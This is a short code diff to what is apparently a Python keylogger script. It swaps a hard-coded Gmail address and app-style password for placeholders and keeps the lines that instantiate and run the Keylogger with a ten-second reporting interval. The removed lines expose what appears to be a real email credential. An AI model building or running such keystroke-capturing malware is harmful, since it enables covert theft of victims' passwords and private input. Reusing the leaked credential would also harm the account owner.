@@ -39,8 +39,8 @@ class Keylogger:
             self.report()
             my_listener.join()
 
-email = "bamajjw@gmail.com"
-password = "ieygqvxsourdlshj"
+email = "xxxxx@gmail.com"
+password = "passcode"
 time_interval = 10
 
 my_keylogger = Keylogger(email, password, time_interval)
